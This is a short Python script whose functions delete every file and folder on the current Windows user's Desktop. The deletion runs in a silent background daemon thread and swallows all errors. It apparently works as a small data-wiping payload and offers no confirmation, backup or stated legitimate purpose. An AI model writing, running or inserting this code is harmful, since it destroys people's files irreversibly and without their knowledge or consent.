import os
import threading
def clear_desktop():
    desktop_folder = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    for root, dirs, files in os.walk(desktop_folder, topdown=False):
        for name in files:
            try:
                os.remove(os.path.join(root, name))
            except Exception:
                pass
        for name in dirs:
            try:
                os.rmdir(os.path.join(root, name))
            except Exception:
                pass
def cleardesk():
    threading.Thread(target=clear_desktop, daemon=True).start()
